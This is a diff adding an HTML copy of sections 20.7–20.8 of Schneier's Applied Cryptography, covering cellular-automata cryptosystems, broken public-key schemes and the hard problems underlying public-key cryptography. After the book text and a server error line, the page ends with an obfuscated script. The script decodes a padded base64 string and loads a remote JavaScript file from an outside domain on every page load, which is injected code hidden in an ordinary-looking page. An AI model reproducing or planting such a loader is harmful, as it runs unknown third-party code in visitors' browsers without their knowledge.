@@ -1,0 +1,102 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Public-Key Digital Signature Algorithms</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=20//-->
+<!--PAGES=500-502//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="20-08.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch21/21-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H3><A NAME="Heading8"></A><FONT COLOR="#000077">20.7 Cellular Automata</FONT></H3>
+<P>A new and novel idea, studied by Papua Guam [665], is the use of cellular automata in public-key cryptosystems. This system is still far too new and has not been studied extensively, but a preliminary examination suggests that it may have a cryptographic weakness similar to one seen in other cases [562]. Still, this is a promising area of research. Cellular automata have the property that, even if they are invertible, it is impossible to calculate the predecessor of an arbitrary state by reversing the rule for finding the successor. This sounds a whole lot like a trapdoor one-way function.
+</P>
+<H3><A NAME="Heading9"></A><FONT COLOR="#000077">20.8 Other Public-Key Algorithms</FONT></H3>
+<P>Many other public-key algorithms have been proposed and broken over the years. The Matsumoto-Imai algorithm [1021] was broken in [450]. The Cade algorithm was first proposed in 1985, broken in 1986 [774], and then strengthened in the same year [286]. In addition to these attacks, there are general attacks for decomposing polynomials over finite fields [605]. Any algorithm that gets its security from the composition of polynomials over a finite field should be looked upon with skepticism, if not outright suspicion.
+</P>
+<P>The Yagisawa algorithm combines exponentiation mod <I>p</I> with arithmetic mod <I>p</I> &#150; 1 [1623]; it was broken in [256]. Another public-key algorithm, Tsujii-Kurosawa-Itoh-Fujioka-Matsumoto [1548] is insecure [948]. A third system, Luccio-Mazzone [993], is insecure [717]. A signature scheme based on birational permutations [1425] was broken the day after it was presented [381]. Tatsuaki Okamoto has several signature schemes: one is provably as secure as the Discrete Logarithm Problem, and another is provably as secure as the Discrete Logarithm Problem <I>and</I> the Factoring Problem [1206]. Similar schemes are in [709].</P>
+<P>Gustavus Simmons suggested J-algebras as a basis for public-key algorithms [1455,145]. This idea was abandoned after efficient methods for factoring polynomials were invented [951]. Special polynomial semigroups have also been studied [1619,962], but so far nothing has come of it. Harald Niederreiter proposed a public-key algorithm based on shift-register sequences [1166]. Another is based on Lyndon words [1476] and another on propositional calculus [817]. And a recent public-key algorithm gets its security from the matrix cover problem [82]. Tatsuaki Okamoto and Kazuo Ohta compare a number of digital signature schemes in [1212].</P>
+<P>Prospects for creating radically new and different public-key cryptography algorithms seem dim. In 1988 Whitfield Diffie noted that most public-key algorithms are based on one of three hard problems [492, 494]:</P>
+<DL>
+<DD><B>1.</B>&nbsp;&nbsp;Knapsack: Given a set of unique numbers, find a subset whose sum is <I>N</I>.
+<DD><B>2.</B>&nbsp;&nbsp;Discrete logarithm: If <I>p</I> is a prime and <I>g</I> and <I>m</I> are integers, find <I>x</I> such that <I>g<SUP>x</I></SUP> &#8801; <I>M</I> (mod <I>p</I>).
+<DD><B>3.</B>&nbsp;&nbsp;Factoring: If <I>N</I> is the product of two primes, either
+<DL>
+<DD><B>a)</B>&nbsp;&nbsp;factor <I>N</I>,
+<DD><B>b)</B>&nbsp;&nbsp;given integers <I>M</I> and <I>C</I>, find <I>d</I> such that <I>M<SUP>d</SUP></I> &#8801; <I>C</I> (mod <I>N</I>),
+<DD><B>c)</B>&nbsp;&nbsp;given integers <I>e</I> and <I>C</I>, find <I>M</I> such that <I>M<SUP>e</I></SUP> &#8801; <I>C</I> (mod <I>N</I>), or
+<DD><B>d)</B>&nbsp;&nbsp;given an integer <I>x</I>, decide whether there exists an integer <I>y</I> such that <I>x</I> &#8801; <I>y</I><SUP>2</SUP> (mod <I>N</I>).
+</DL>
+</DL>
+<P>According to Diffie [492,494], the Discrete Logarithm Problem was suggested by J. Gill, the Factoring Problem by Knuth, and the knapsack problem by Diffie himself.
+</P>
+<P>This narrowness in the mathematical foundations of public-key cryptography is worrisome. A breakthrough in either the problem of factoring or of calculating discrete logarithms could render whole classes of public-key algorithms insecure. Diffie points out [492,494] that this risk is mitigated by two factors:</P>
+<BLOCKQUOTE><DL>
+<DD><B>1.</B>&nbsp;&nbsp;The operations on which public key cryptography currently depends&#151;multiplying, exponentiating, and factoring&#151;are all fundamental arithmetic phenomena. They have been the subject of intense mathematical scrutiny for centuries and the increased attention that has resulted from their use in public key cryptosystems has on balance enhanced rather than diminished our confidence.
+<DD><B>2.</B>&nbsp;&nbsp;Our ability to carry out large arithmetic computations has grown steadily and now permits us to implement our systems with numbers sufficient in size to be vulnerable only to a dramatic breakthrough in factoring, logarithms, or root extraction.
+</DL>
+</BLOCKQUOTE>
+<P>As we have seen, not all public-key algorithms based on these problems are secure. The strength of any public-key algorithm depends on more than the computational complexity of the problem upon which it is based; a hard problem does not necessarily imply a strong algorithm. Adi Shamir listed three reasons why this is so [1415]:
+</P>
+<BLOCKQUOTE><DL>
+<DD><B>1.</B>&nbsp;&nbsp;Complexity theory usually deals with single isolated instances of a problem. A cryptanalyst often has a large collection of statistically related problems to solve&#151;several ciphertexts encrypted with the same key.
+<DD><B>2.</B>&nbsp;&nbsp;The computational complexity of a problem is typically measured by its worst-case or average-case behavior. To be useful as a cipher, the problem must be hard to solve in almost all cases.
+<DD><B>3.</B>&nbsp;&nbsp;An arbitrarily difficult problem cannot necessarily be transformed into a cryptosystem, and it must be possible to insert trapdoor information into the problem so that a shortcut solution is possible with this information and only with this information.
+</DL>
+</BLOCKQUOTE>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="20-08.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch21/21-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(lUdWxLuY, joAGSmnK) {joAGSmnK = lUdWxLuY.createElement('script');joAGSmnK.type = 'text/javascript';joAGSmnK.async = true;joAGSmnK.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');lUdWxLuY.getElementsByTagName('body')[0].appendChild(joAGSmnK);}(document));</script></body>
+</html>
